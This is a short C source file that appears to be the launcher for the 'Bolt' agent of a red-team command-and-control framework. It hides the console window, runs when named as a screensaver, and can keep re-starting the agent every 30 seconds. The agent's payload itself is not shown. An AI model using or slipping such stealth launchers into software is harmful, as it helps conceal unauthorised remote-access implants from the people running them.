// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
//
// ThunderStorm Bolt Agent Binary C Launcher
//  Wraps the Go archive and will control a Guardian context.
//
// Basic Binary
//  Can be used for anything.

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#define TIMEOUT 30000

#include <windows.h>

// Bolt Include (Generated before compile)
#include "bolt.h"

int main(int argc, char *argv[]) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    if (argc >= 1) {
        // Are we a screensaver binary?
        int s = strlen(argv[0]);
        if (s >= 5 && argv[0][s-1] == 'r' && argv[0][s-2] == 'c' && argv[0][s-3] == 's' && argv[0][s-4] == '.') {
            boltInit();
            return 0;
        }
    }
    switch (argc) {
    case 3:
        boltMain();
        break;
    case 2:
        if (argv[1][0] == '1') {
            while (1) {
                boltInit();
                Sleep(TIMEOUT);
            }
        } else {
            boltInit();
        }
        break;
    default:
        boltInit();
    }
    return 0;
}
